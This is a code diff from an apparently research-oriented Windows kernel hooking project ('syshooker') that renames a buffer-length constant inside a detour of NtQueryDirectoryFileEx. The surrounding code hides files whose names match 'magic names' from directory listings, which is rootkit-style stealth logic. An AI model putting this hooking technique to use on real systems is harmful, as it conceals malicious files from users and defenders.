@@ -38,8 +38,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 	if (NT_SUCCESS(OriginalStatus)) {
 		if (FileName != nullptr) {
 			// check whether the user-supplied FileName query contains the filename that we want to hide, if yes, return File Not Found
-			WCHAR TempBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
+			WCHAR TempBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+			for (size_t i = 0; i < FileName->Length && i < SYSHOOKER_MAX_NAME_LENGTH - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
 			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is used in tab-autocomplete filename
@@ -53,8 +53,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_DIRECTORY_INFORMATION PreviousFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -106,8 +106,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			//kprintf("[+] syshooker: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -161,8 +161,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -213,8 +213,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_NAMES_INFORMATION PreviousFileInformationPtr = (PFILE_NAMES_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -265,8 +265,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -317,8 +317,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_ID_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -369,8 +369,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_ID_GLOBAL_TX_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -421,8 +421,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_ID_EXTD_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
@@ -473,8 +473,8 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			PFILE_ID_EXTD_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
